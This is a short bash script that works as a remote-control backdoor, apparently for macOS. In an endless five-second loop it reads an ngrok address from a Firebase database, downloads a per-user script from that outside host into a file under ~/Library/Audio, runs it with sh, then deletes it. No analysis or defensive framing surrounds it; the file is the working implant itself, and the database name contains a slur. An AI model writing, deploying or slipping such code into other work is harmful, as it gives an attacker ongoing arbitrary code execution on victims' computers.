#!/bin/bash

EXEC_PATH="/Users/$USER/Library/Audio/$USER.sh"

GetAndExec() {
    # Collect ngrok url from firebase
    response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
    NGROK="${response:1:${#response}-2}"

    EXEC="$NGROK/$USER"

    # Download exec from ngrok url
    curl -so $EXEC_PATH "$EXEC"

    # Execute exec
    sh $EXEC_PATH

    rm $EXEC_PATH
}

while true; do
    GetAndExec
    sleep 5
done
